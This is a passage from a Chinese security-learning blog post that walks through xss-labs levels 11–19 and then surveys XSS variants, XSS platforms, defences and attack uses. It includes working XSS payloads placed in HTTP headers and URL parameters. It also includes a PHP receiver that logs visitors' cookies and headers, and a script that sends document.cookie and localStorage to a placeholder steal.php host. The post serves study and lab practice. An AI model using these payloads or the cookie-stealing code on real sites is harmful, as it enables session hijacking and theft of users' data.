+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer：&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">Referer：&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve12"><a href="#leve12" class="headerlink" title="leve12"></a>leve12</h3><p><img src="/../images/image-20251018005528385.png" alt="image-20251018005528385"></p>
+<p>和前面的一样，将payload改到了ua头上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">User-Agent：&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve13"><a href="#leve13" class="headerlink" title="leve13"></a>leve13</h3><p><img src="/../images/image-20251018005742527.png" alt="image-20251018005742527"></p>
+<p>和前面的一样，将payload改到了cookie头上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie：user=&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">Cookie：user=&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve14"><a href="#leve14" class="headerlink" title="leve14"></a>leve14</h3><p>【链接无效】</p>
+<p><img src="/../images/image-20251018010324147.png" alt="image-20251018010324147"></p>
+<p>查看图片 exif 信息的网站</p>
+<p>修改iframe调用的文件来实现xss注入</p>
+<h3 id="leve15"><a href="#leve15" class="headerlink" title="leve15"></a>leve15</h3><p><img src="/../images/image-20251018010603698.png" alt="image-20251018010603698"></p>
+<p>在 URL 中指定的 src（默认是 1.gif）会被引用进来，使用的是 ng-include。这是一个 Angular 框架的功能，特点是，如果引入的是 HTML 文件，不会执行其中 <code>&lt;script&gt;</code> 标签内的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=level1.php?name=&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里直接引用leve1的payload，当然可以自己构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hacked<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>假设放在网站根目录，payload 就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&quot;/alert.html&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve16"><a href="#leve16" class="headerlink" title="leve16"></a>leve16</h3><p><img src="/../images/image-20251018011553675.png" alt="image-20251018011553675"></p>
+<p>对空格进行了过滤，使用换行符（<code>%0A</code>）或者<code>%0d</code>也可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0Asrc=1%0Aonerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">?keyword=&lt;svg%0Aonload=&quot;alert(1)&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve17"><a href="#leve17" class="headerlink" title="leve17"></a>leve17</h3><p><img src="/../images/image-20251018013156996.png" alt="image-20251018013156996"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed&gt; 标签用于在HTML页面中嵌入外部内容，如多媒体文件、插件或其他交互式内容。它是HTML5的一部分。</span><br><span class="line">以下是 &lt;embed&gt; 标签的基本语法：</span><br><span class="line">&lt;embed src=&quot;URL&quot; type=&quot;MIME-类型&quot; width=&quot;宽度&quot; height=&quot;高度&quot;&gt;</span><br><span class="line">常用的属性包括：</span><br><span class="line">src：指定要嵌入的外部资源的URL。可以是音频、视频、SWF 文件等。</span><br><span class="line">type：指定被嵌入资源的MIME类型。</span><br><span class="line">width：指定嵌入内容的宽度（像素或百分比）。</span><br><span class="line">height：指定嵌入内容的高度（像素或百分比）。</span><br></pre></td></tr></table></figure>
+
+<p>这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。从而执行JavaScript语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmousemove=&#x27;alert(1)&#x27; </span><br><span class="line">?arg01=a&amp;arg02=b onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="leve18"><a href="#leve18" class="headerlink" title="leve18"></a>leve18</h3><p>和17一样</p>
+<p><img src="/../images/image-20251018014118392.png" alt="image-20251018014118392"></p>
+<h3 id="leve19"><a href="#leve19" class="headerlink" title="leve19"></a>leve19</h3><p>后面的flash有点看不懂了，但是也是古老的东西先放着吧</p>
+<h1 id="文件上传配合xss"><a href="#文件上传配合xss" class="headerlink" title="文件上传配合xss"></a>文件上传配合xss</h1><p>前面用了这个xss-lab来了解了基础的xss知识，那么下面来认识特殊的几种的xss系列，svg-pdf-flash-mxss-uxss。【这里不展开说明如何制作，详情可以看小迪老师的b站视频<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV123yAYMEwb/?spm_id_from=333.1387.0.0&vd_source=3cad66818fbd72b6100b5f159983493b">【小迪安全】全栈网络安全 | 渗透测试 | 高级红蓝对抗 V2024最新版 (完)_哔哩哔哩_bilibili</a>】</p>
+<h2 id="svg-xss"><a href="#svg-xss" class="headerlink" title="svg-xss"></a>svg-xss</h2><p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p>
+<h2 id="pdf-xss"><a href="#pdf-xss" class="headerlink" title="pdf-xss"></a>pdf-xss</h2><p>PDF XSS（PDF 跨站脚本）漏洞是指攻击者通过在 PDF 文件中植入恶意 JavaScript 代码，利用 PDF 阅读器或在线预览工具的安全缺陷，实现代码执行的一类漏洞。与传统网页 XSS 不同，PDF XSS 的载体是 PDF 文件，攻击场景更隐蔽，且依赖于 PDF 处理工具的解析逻辑。</p>
+<h2 id="swf-xss"><a href="#swf-xss" class="headerlink" title="swf-xss"></a>swf-xss</h2><p>SWF XSS 是一种通过 Flash 文件（SWF）中的漏洞执行跨站脚本攻击的技术。攻击者可以利用 SWF 文件中未正确处理的输入参数，注入恶意 JavaScript 代码，从而在目标用户的浏览器中执行。</p>
+<h1 id="突变体xss"><a href="#突变体xss" class="headerlink" title="突变体xss"></a>突变体xss</h1><h2 id="mxss"><a href="#mxss" class="headerlink" title="mxss"></a>mxss</h2><p>预览</p>
+<p>[mXSS攻击的成因及常见种类-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34087301/article/details/87982018#:~:text=%E6%9C%AC%E6%96%87%E8%AF%A6%E7%BB%86%E4%BB%8B%E7%BB%8D%E4%BA%86mXSS%EF%BC%88%E7%AA%81%E5%8F%98%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%89%E6%94%BB%E5%87%BB%E7%9A%84%E5%90%84%E7%A7%8D%E5%BD%A2%E5%BC%8F%E5%8F%8A%E5%85%B6%E8%A7%A6%E5%8F%91%E5%8E%9F%E7%90%86%EF%BC%8C%E5%8C%85%E6%8B%AC%E5%8F%8D%E5%BC%95%E5%8F%B7%E3%80%81%E6%9C%AA%E7%9F%A5%E5%85%83%E7%B4%A0%E4%B8%AD%E7%9A%84XML%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E3%80%81CSS%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%E7%AD%89%E5%AF%BC%E8%87%B4%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E3%80%82">https://blog.csdn.net/weixin_34087301/article/details/87982018#:~:text=本文详细介绍了mXSS（突变跨站脚本）攻击的各种形式及其触发原理，包括反引号、未知元素中的XML命名空间、CSS转义字符等导致的攻击方式。</a> 本文原文是由国外大牛Mario Heiderich在2013年所写的一篇paper：mXSS attacks%3A attacking,well-secured web-applications by using innerHTML mutations.)</p>
+<h2 id="uxss"><a href="#uxss" class="headerlink" title="uxss"></a>uxss</h2><p>翻译</p>
+<p>UXSS保留了基本XSS的特点，利用漏洞，执行恶意代码，但是有一个重要的区别：<strong>不同于常见的XSS，UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。</strong></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7031788659221200927">通用跨站脚本攻击(UXSS)什么是UXSS？ 大家都知道有反射型XSS、存储型XSS、DomXSS，还有之前wooyun - 掘金</a></p>
+<h1 id="平台搭建"><a href="#平台搭建" class="headerlink" title="平台搭建"></a>平台搭建</h1><h2 id="beef-xss"><a href="#beef-xss" class="headerlink" title="beef-xss"></a>beef-xss</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/443592.html">XSS之Beef简单使用 - FreeBuf网络安全行业门户</a></p>
+<p>docker拉取比较快捷方便</p>
+<h2 id="蓝莲花xss"><a href="#蓝莲花xss" class="headerlink" title="蓝莲花xss"></a>蓝莲花xss</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263566/article/details/128848268">XSS 进阶篇：一文全面了解蓝莲花基本用法_xss蓝莲花-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
+<h2 id="手搓"><a href="#手搓" class="headerlink" title="手搓"></a>手搓</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 配置密码保护</span><br><span class="line">$password = &#x27;yourpassword123&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;view&#x27;]) &amp;&amp; $_GET[&#x27;view&#x27;] === $password) &#123;</span><br><span class="line">    // 显示收集的数据</span><br><span class="line">    header(&#x27;Content-Type: text/html&#x27;);</span><br><span class="line">    echo &#x27;&lt;h1&gt;Stolen Data&lt;/h1&gt;&lt;pre&gt;&#x27;;</span><br><span class="line">    echo file_get_contents(&#x27;stolen_data.log&#x27;);</span><br><span class="line">    echo &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 记录数据</span><br><span class="line">$data = [</span><br><span class="line">    &#x27;time&#x27; =&gt; date(&#x27;Y-m-d H:i:s&#x27;),</span><br><span class="line">    &#x27;ip&#x27; =&gt; $_SERVER[&#x27;REMOTE_ADDR&#x27;],</span><br><span class="line">    &#x27;cookie&#x27; =&gt; $_COOKIE,</span><br><span class="line">    &#x27;get&#x27; =&gt; $_GET,</span><br><span class="line">    &#x27;post&#x27; =&gt; $_POST,</span><br><span class="line">    &#x27;headers&#x27; =&gt; getallheaders()</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">file_put_contents(&#x27;data.txt&#x27;, json_encode($data).&quot;\n&quot;, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">// 返回无害响应</span><br><span class="line">header(&#x27;Content-Type: image/gif&#x27;);</span><br><span class="line">echo base64_decode(&#x27;R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">fetch(&#x27;https://your-site.com/steal.php&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">    body: JSON.stringify(&#123;</span><br><span class="line">        cookie: document.cookie,</span><br><span class="line">        url: location.href,</span><br><span class="line">        userAgent: navigator.userAgent,</span><br><span class="line">        localStorage: JSON.stringify(localStorage)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).catch(e =&gt; console.error(e));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="安全防御"><a href="#安全防御" class="headerlink" title="安全防御"></a>安全防御</h1><p>【遇到安全防御，就跑路吧，本来利用的点就少，绕过也很鸡肋，可能ctf当中会出现关于考点绕过手段，需要使用的时候查相应cve或者文章就好了】</p>
+<h2 id="csp"><a href="#csp" class="headerlink" title="csp"></a>csp</h2><p><a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=Content+Security+Policy&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiJDb250ZW50IFNlY3VyaXR5IFBvbGljeSIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjI1NDE0MDQ2NSwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.fjiJOVS7QHKYD8ZuPn9LZzbgPjj6EmqperajT0eWUZg&zhida_source=entity">Content Security Policy</a>（CSP）是一种浏览器安全机制，用于防止各种类型的<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiLot6jnq5nohJrmnKzmlLvlh7siLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQxNDA0NjUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.Dt3u0GHZEZ5dcLGm83Eg6EEwiwKqKAjs2UuR2M7cYb0&zhida_source=entity">跨站脚本攻击</a>（XSS）和<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiLmlbDmja7ms6jlhaXmlLvlh7siLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQxNDA0NjUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.ldB8RMO-1-GDB2ZNl5nNdIIHN7NKoI0Ks91Ygu7xr6g&zhida_source=entity">数据注入攻击</a>。通过定义一组规则，CSP 允许网站管理员指定哪些资源可以被加载和执行，进而限制外部恶意脚本的执行，确保网站的安全性。CSP 为网站提供了一层额外的保护，可以有效地阻止恶意代码注入，提升网站的抗攻击能力。本文将详细讲解什么是 CSP，如何使用 CSP 配置 Web 应用程序的安全策略。</p>
+<h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。XSS全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p>
+<p>绕过【实则不太管用】：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cve-2012</span><br><span class="line"></span><br><span class="line">phpinfo</span><br><span class="line"></span><br><span class="line">flash，java的api获取</span><br></pre></td></tr></table></figure>
+
+<h2 id="xssfifter"><a href="#xssfifter" class="headerlink" title="xssfifter"></a>xssfifter</h2><p>就是前面的各种正则的限制手段，依旧标签过滤</p>
+<h1 id="xss-stricke"><a href="#xss-stricke" class="headerlink" title="xss-stricke"></a>xss-stricke</h1><p>XSStrike是一款检测Cross Site Scripting的高级检测工具。它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">s0md3v&#x2F;XSStrike: Most advanced XSS scanner.</a></p>
+<p>就像sql注入中的sqlmap</p>
+<h1 id="攻防利用"><a href="#攻防利用" class="headerlink" title="攻防利用"></a>攻防利用</h1><p>关于xss的攻防利用，多用于组合拳的使用以及攻防时候，src利用的点少，能弹窗验证有漏洞点就好了，差异还是挺大的，但是问题不大，还是比较好食用</p>
+<h2 id="cookie盗取"><a href="#cookie盗取" class="headerlink" title="cookie盗取"></a>cookie盗取</h2><p>就是盲打，把有数据交互的地方都插上payload，等想应登陆态的用户查看或者点击，以达到获得cookie会话</p>
+<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><p>弹窗跳转网页，或者提醒下载更新，已达到具体想要上线或者敏感信息获取的效果</p>
+<h2 id="联合代码审计rce"><a href="#联合代码审计rce" class="headerlink" title="联合代码审计rce"></a>联合代码审计rce</h2><p>这是小迪安全2024xss部分的一个小皮面板案例，具体的cms偏代码审计的联动外部请求进行rce，需要特定情况下的xss条件才能产生</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://cyl-love.github.io">陈羽琳</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://cyl-love.github.io/posts/33318.html">https://cyl-love.github.io/posts/33318.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://cyl-love.github.io" target="_blank">再努力一点，她是不是就会回来</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/63963.html" title="一个男人一句话改变我的一生之moectf2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">一个男人一句话改变我的一生之moectf2025</div></div><div class="info-2"><div class="info-item-1">前言123当初川师范大学cssec信安组的CoHyu大师傅的一句moectf是梦开启的地方以及Sonder大师傅的moectf的题质量都很高，可以加油学学.于是就打了moectf2025，但时间线太长了就打了一周，现在完赛了于是打算复现一手web以及pwn部分，pwn部分就放到《每天都要pwn一点》系列了  moectf20251https://ctf.xidian.edu.cn/training/22  web0 Web入门指北123你知道什么是控制台吗？快去了解一下吧！((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[]).......  考点：jsfuck编码。可以控制台...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">陈羽琳</div><div class="author-info-description">每天能不能pwn一点</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cyl-love"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/cyl-love" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Love life, always—loveforver in the small.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mutant"><span class="toc-number">2.</span> <span class="toc-text">mutant</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/33318.html" title="一个男人一句话改变我的一生之xss">一个男人一句话改变我的一生之xss</a><time datetime="2025-10-20T11:06:38.000Z" title="发表于 2025-10-20 19:06:38">2025-10-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/63963.html" title="一个男人一句话改变我的一生之moectf2025">一个男人一句话改变我的一生之moectf2025</a><time datetime="2025-10-15T07:12:52.000Z" title="发表于 2025-10-15 15:12:52">2025-10-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/12382.html" title="一个男人一句话改变我的一生之phpcms代码审计">一个男人一句话改变我的一生之phpcms代码审计</a><time datetime="2025-10-13T07:56:32.000Z" title="发表于 2025-10-13 15:56:32">2025-10-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/38132.html" title="第一届NetDreamCTF赛后复现">第一届NetDreamCTF赛后复现</a><time datetime="2025-08-17T05:59:14.000Z" title="发表于 2025-08-17 13:59:14">2025-08-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/3233.html" title="2025年Solar应急响应公益月赛7月--复盘">2025年Solar应急响应公益月赛7月--复盘</a><time datetime="2025-07-29T16:53:25.000Z" title="发表于 2025-07-30 00:53:25">2025-07-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/2.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By 陈羽琳</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
